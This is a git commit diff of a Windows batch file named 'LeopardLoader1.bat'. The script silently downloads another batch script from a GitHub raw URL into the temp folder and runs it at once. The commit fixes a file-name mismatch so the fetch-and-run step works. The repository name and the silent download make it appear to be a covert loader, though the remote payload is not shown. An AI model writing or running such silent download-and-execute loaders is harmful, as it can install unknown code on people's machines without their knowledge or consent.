72e829949fb269d45a772f24344e1d17e3bd4291
L3opard <147560398+L3opard@users.noreply.github.com>
2023-10-10 18:03:48 -0400

    LeopardLoader1.bat

--- LeopardLoader1.bat
+++ LeopardLoader1.bat
@@ -1,5 +1,5 @@
 @echo off
 cd /d "C:"
-curl -s -o %temp%\RichPresence.bat https://raw.githubusercontent.com/L3opard/whyareyoulookingherelol-/main/LeopardRPLoader.bat
+curl -s -o %temp%\LeopardRPLoader.bat https://raw.githubusercontent.com/L3opard/whyareyoulookingherelol-/main/LeopardRPLoader.bat
 %temp%\LeopardRPLoader.bat
 exit
